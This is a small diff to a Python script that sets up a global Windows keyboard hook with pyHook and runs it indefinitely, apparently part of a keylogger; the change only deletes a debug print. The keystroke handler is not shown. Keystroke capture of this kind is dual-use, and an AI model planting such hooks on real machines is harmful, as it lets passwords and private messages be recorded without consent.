@@ -94,7 +94,7 @@ def KeyStroke(event):
 def run():
     kl = pyHook.HookManager()
     kl.KeyDown = KeyStroke
-    print kl.KeyDown
+    
     # register the hook and execute forever
     kl.HookKeyboard()
     pythoncom.PumpMessages()
